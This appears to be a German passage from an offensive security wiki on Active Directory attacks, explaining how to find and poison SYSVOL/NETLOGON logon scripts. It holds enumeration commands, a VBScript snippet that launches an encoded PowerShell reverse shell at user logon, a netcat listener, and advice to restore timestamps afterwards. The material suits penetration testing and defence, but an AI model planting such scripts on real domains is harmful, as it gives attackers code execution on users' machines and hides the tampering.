- **Startskripte** werden normalerweise im Kontext des **Computers / SYSTEM** ausgeführt.

Wenn der Skriptpfad auf einen Hostnamen verweist, der sich spoofing lässt, leite den UNC-Host um und stelle am erwarteten Speicherort Ersatzskriptinhalte bereit.

## Poisoning von SYSVOL/NETLOGON-Anmeldeskripten

Beschreibbare Pfade unter `\\<dc>\SYSVOL\<domain>\scripts\` oder `\\<dc>\NETLOGON\` ermöglichen es, Anmeldeskripte zu manipulieren, die bei der Benutzeranmeldung über GPO ausgeführt werden. Dadurch wird Code im Sicherheitskontext der angemeldeten Benutzer ausgeführt.

### Anmeldeskripte finden
- Untersuche Benutzerattribute auf ein konfiguriertes Anmeldeskript:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Durchsuche Domänenfreigaben nach Verknüpfungen oder Verweisen auf Skripte:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- `.lnk`-Dateien parsen, um Ziele aufzulösen, die auf SYSVOL/NETLOGON verweisen (nützlicher DFIR-Trick für Angreifer ohne direkten GPO-Zugriff):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound zeigt das Logon-Script-Attribut `scriptPath` des Benutzerobjekts an, sofern vorhanden. Über GPO konfigurierte Logon-Scripts sind eine separate Richtlinienreferenz. Prüfe daher auch die anwendbare GPO.

### Schreibzugriff validieren (Share-Auflistungen nicht vertrauen)
Automatisierte Tools können SYSVOL/NETLOGON als schreibgeschützt anzeigen, obwohl die NTFS-ACL des konkreten Scripts abweicht. Beginne mit einer schreibgeschützten Prüfung der Datei und ihres übergeordneten Verzeichnisses. Übereinstimmende Allow-ACEs sind mögliche Kandidaten, da der effektive SMB- und NTFS-Zugriff, Deny-ACEs und das aktuelle Token eine Rolle spielen:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ein autorisierter Schreibtest sollte sich gezielt auf das Ziel beziehen und reversibel sein. Das ursprüngliche Skript sollte gesichert und anschließend wiederhergestellt werden. Überschreibe kein funktionierendes Logon-Skript, nur um den Zugriff zu testen: Ein erfolgreicher Schreibvorgang kann beim nächsten Logon eines Benutzers ausgeführt werden.

### Ein VBScript-Logon-Skript für RCE manipulieren
Hänge einen Befehl an, der eine PowerShell reverse shell startet (erstelle sie mit revshells.com), und behalte die ursprüngliche Logik bei, damit die Geschäftsfunktion nicht beeinträchtigt wird:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Auf deinem Host lauschen und auf die nächste interaktive Anmeldung warten:

```bash
rlwrap -cAr nc -lnvp 443
```

Hinweise:
- Die Ausführung erfolgt mit dem Token des Protokollierungsbenutzers (nicht SYSTEM). Der GPO-Link (OU, Standort, Domäne), der das Skript anwendet, bestimmt den Geltungsbereich.
- Stelle nach der Verwendung den ursprünglichen Inhalt und die ursprünglichen Zeitstempel wieder her.


## References

- [1] [Missbrauch von Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privilegierte Konten und Token-Berechtigungen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Das Update zu ACL-Angriffspfaden](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum – Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Rechteausweitung mit ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Suche nach Active Directory-Berechtigungen und privilegierten Konten](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule-Konstruktor – Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – AD-Attribut-/UAC-Operationen unter Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (Gruppenmitgliedschaft)](https://www.samba.org/)
- [10] [HTB Puppy: AD-ACL-Missbrauch, KeePassXC-Argon2-Cracking und DPAPI-Entschlüsselung bis zum DC-Administrator](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec – ARP Around and Find Out: Übernahme von GPO-UNC-Pfaden zur Codeausführung und für NTLM-Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: Ausnutzung von Active Directory-GPOs über NTLM-Relaying und mehr](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU macht sich einen Spaß? – Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Ausnutzung versteckter Organizational Units als ACL-Angriffsvektoren in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation legitimer Active Directory-Dienste im Netzwerk: der Fall der GPO-Ausnutzung](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
